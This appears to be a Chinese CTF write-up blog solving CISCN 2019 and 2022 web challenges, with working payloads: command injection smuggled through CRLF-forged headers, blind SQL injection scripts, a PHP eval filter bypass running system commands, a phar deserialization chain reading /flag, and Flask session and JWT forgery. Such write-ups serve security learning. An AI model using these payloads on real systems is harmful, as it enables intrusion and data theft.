## [CISCN 2022 初赛]online_crt

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220602160204.png)

go源码中的admin路由有文件重命名，

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220602161114.png)

py源码中在createlink路由中会执行系统命令

c_rehash这个命令有一个cve

1.随便找一个pem文件，假设其路径为/tmp/test-cert.pem 2.将$fname参数设置为"/tmp/test-cert.pem"&&whoami&&echo" 最终的执行命令为：openssl x509 -subject_hash -fingerprint -noout -in "/tmp/test-cert.pem"&&whoami&&echo""

whoami就是我们要执行的命令，所以我们要把crt文件重命名来实现rce

能重命名的是go的网站但是没有对外网开放，我们只能通过py网站的proxy路由访问

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220602180202.png)

我们先去get_crt路由创建一个crt文件用于改名

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220602180936.png)

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220602181158.png)

然后去proxy访问admin/rename

发现要先过个判断

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220603151857.png)

需要我们去更改http的请求头

但是

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220603152258.png)

flask这里已经给了请求头，所以我们要有换行符需要伪造请求头

payload

uri=/admin/renam%25%36%35?oldname=6271e5b3-a881-4ba2-8de1-d76517f1ec81.crt%26newname=1.crt%2522%257C%257Cecho%2520Y2F0IC9mbGFnID5jbm0udHh0%257Cbase64%2520-d%257Cbash%2526%2526echo%2522%20HTTP/1.1%0d%0aHost:%20admin%0d%0aConnection:close%0d%0a%0d%0a

## [CISCN 2022 初赛]ezpop

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610191930.png)

thinkphp6反序列化，网上就有payload，用www.zip看源码，找对路由就行

## [CISCN 2022 初赛]ezpentest

和虎符的题目很像就是多了一些过滤，大小写用utf8mb4_bin+collate来判断，但是原来的~0溢出用不了因为~被过滤了，要换成!0+18446744073709551615+1+''，让整数溢出

regexp也被过滤了用不了，用%来代替

payload

```python
import requests
url='http://1.14.71.254:28465/login.php'
k=''
for i in range(1,50):
    for ascii in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}!@$^&._'":
        t=ascii

        payload={
            'password':'xxx',
            # "username":f"'||case`username`like'{flag+temp}%'COLLATE'utf8mb4_bin'when'1'then!0+18446744073709551615+1+''else'0'end||'",
            "username":f"'||case`password`like'{k+t}%'COLLATE'utf8mb4_bin'when'1'then!0+18446744073709551615+1+''else'0'end||'",
        }
        response=requests.post(url=url, data=payload)
        if response.status_code==500:
            k+=t
            print(flag)
            break
```

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610201849.png)

但是登不上不知道怎么回事

## [CISCN 2019华北Day2]Web1

简单题,用sql的if盲注,空格被过滤用括号

payload

```python
import requests

url = 'http://1.14.71.254:28985/index.php'
U = ''

for i in range(1, 50):
    for j in range(32, 140):

        payload = "if((ascii(substr((select(flag)from(flag)),{},1))={}),1,0)".format(i, j)
        data = {"id": payload}
        res = requests.post(url=url, data=data)  # 请求

        if 'Hello, glzjin wants a girlfriend' in res.text:
            U = U + chr(j)

            print(U)
            break

```

## [CISCN 2019华东南]Web11

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220607141059.png)会显示ip和xff，我们尝试修改看看

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220607141711.png)在这会显示

题目给了提示是smart的ssti，smarty是php的框架可以执行php命令

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220607143403.png)

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220607142948.png)

拿到flag

## [CISCN 2019初赛]Love Math

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220607175341.png)

可以看到有给eval可以命令执行，但是过滤了很多函数，并且限制了长度，不能用无字母getshell。

php有一个特性，变量可以被当成函数使用

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608150540.png)

可以看到dir命令被执行了。

而本题目只对传入的c进行了过滤，我们只要把我们要执行的命令用别的参数传进去就行了，然后执行c去获取我们传进去的参数

例如

```
?c=$_GET[a]($_GET[b])&a=system&b=cat /ls
```

但是白名单里没有GET，我们看看白名单里有什么

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608151951.png)

一些数学函数，由数学我们就可想到asc码可以转换数字和字符串，我们看看白名单里有没有可以利用的函数

hex2bin()可以转换16进制成字符，但是16进制会带字母，会被过滤所以我们要用base_convert()把10进制转换成16进制

paylaod

```
?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /flag
```



![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608153715.png)

拿到flag

## [CISCN 2019华北Day1]Web1

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608154118.png)

先注册登入

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608154204.png)

看到可以上传文件

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608154534.png)

试下下载，burp抓包

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608154611.png)

看到dowload路由，并且post了我们要下的文件名，猜一手能读flag

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608155007.png)

能读文件但是读不到flag，那就先读个源码把家人们

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}
?>


<!DOCTYPE html>
<html>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>网盘管理</title>

<head>
    <link href="static/css/bootstrap.min.css" rel="stylesheet">
    <link href="static/css/panel.css" rel="stylesheet">
    <script src="static/js/jquery.min.js"></script>
    <script src="static/js/bootstrap.bundle.min.js"></script>
    <script src="static/js/toast.js"></script>
    <script src="static/js/panel.js"></script>
</head>

<body>
    <nav aria-label="breadcrumb">
    <ol class="breadcrumb">
        <li class="breadcrumb-item active">管理面板</li>
        <li class="breadcrumb-item active"><label for="fileInput" class="fileLabel">上传文件</label></li>
        <li class="active ml-auto"><a href="#">你好 <?php echo $_SESSION['username']?></a></li>
    </ol>
</nav>
<input type="file" id="fileInput" class="hidden">
<div class="top" id="toast-container"></div>

<?php
include "class.php";

$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>
```

看到由class.php，读一下，这题应该是个反序列化

```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>

```

看到file类的close有file_get_contents函数可以读文件，在FileList类里会创建flie类，并且会打印出来，所以我们要先办法在FileList里调用file的close方法，看到filelist的call方法在调用filelist没有的方法时会去调用file的方法，在use类里会调用db变量的close方法，我们只要让db为filelist就好了，但是本体没有反序列化的点，有上传我们就要用phar反序列化

payload

```php
<?php
class User {
    public $db;
}
class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;
    public function __construct() {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();

        $file = new File();
        $file->filename = '/flag.txt';	# 这里的flag.txt是多次猜测出来的
        array_push($this->files, $file);
    }
}

$user = new User();
$filelist = new FileList();
$user->db = $filelist;

$phar = new Phar("phr.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("GIF89a"."<\?php __HALT_COMPILER(); ?>");  //设置stub，增加gif文件头
$phar->setMetadata($user); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

```

改后缀上传，delect用phar协议触发反序列化

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608172250.png)

拿到flag

## [CISCN 2019华东南]Double Secret

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610132912.png)

什么都没有我们扫下目录

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610133125.png)

robots.txt没什么用

再看看

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610133657.png)

有console目录应该是flask框架，flask框架我们可以从dubug模式入手

但是首先要让他报错

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610134635.png)

在secret路由可以传参数，看看能不能让他报错

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610142000.png)

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610142255.png)

是ascii码的报错，我们来看看源码

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610142432.png)

做了个rc4加密，之后进行了模板渲染，看到模板渲染我们就想到ssti

我们先来看看rc4加密

key是HereIsTreasure

我们找个脚本把我们的payload加密

```python
import base64
from urllib.parse import quote
def rc4_main(key = "HereIsTreasure", message = "ciscn"):
    # print("RC4加密主函数")
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return  crypt
def rc4_init_sbox(key):
    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可
    # print("原来的 s 盒：%s" % s_box)
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    # print("混乱后的 s 盒：%s"% s_box)
    return s_box
def rc4_excrypt(plain, box):
    # print("调用加密程序成功。")
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    # print("res用于加密字符串，加密后是：%res" %res)
    cipher = "".join(res)
    print("加密后的字符串是：%s" %quote(cipher))
    #print("加密后的输出(经过编码):")
    #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
```

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610144709.png)拿到flag

## [CISCN 2019华东南]Web4

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610144832.png)

看到readsomething点进去看看

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610145153.png)

试试用url读本地文件

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610145335.png)

能读

这个路由没有php后缀应该是python的网站我们读下源码

```python
import re, random, uuid, urllib
from flask import Flask, session, request

app = Flask(__name__)
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
app.debug = True

@app.route('/')
def index():
    session['username'] = 'www-data'
    return 'Hello World! <a href="/read?url=https://baidu.com">Read somethings</a>'

@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        m = re.findall('^file.*', url, re.IGNORECASE)
        n = re.findall('flag', url, re.IGNORECASE)
        if m or n:
            return 'No Hack'
        res = urllib.urlopen(url)
        return res.read()
    except Exception as ex:
        print str(ex)
    return 'no response'

@app.route('/flag')
def flag():
    if session and session['username'] == 'fuck':
        return open('/flag.txt').read()
    else:
        return 'Access denied'

if __name__=='__main__':
    app.run(
        debug=True,
        host="0.0.0.0"
    )

```

我们要伪造session能读到flag，伪造session需要密钥，

```
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random()*233)
```

密钥是个随机数由random赋予uuid.getnode()是由mac地址决定的

我们查看地址

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610155637.png)

然后伪造session

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610162221.png)

拿到flag

## [CISCN 2019华北Day1]Web2

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610171015.png)

爆破，找v6买找了好久没找到v6写个脚本找

```python
import requests
url = "http://1.14.71.254:28142/shop?page={}"
for i in range(1,1000):
    url1=url.format(i)
    html = requests.get(url1)
    if "lv6.png" in html.text:
        print('ok')
        print(i)
        break
    else:
        print('no')
```

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610171759.png)

找到lv6

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610171913.png)

money不够买不了

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610172958.png)

小改一波

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610173138.png)

要admin才能登陆

![](https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610173526.png)

要改jwt

我们要知道密钥

[JWT brute-force爆破](https://github.com/brendan-rius/c-jwt-cracker)小暴一下

知道密钥是ikun

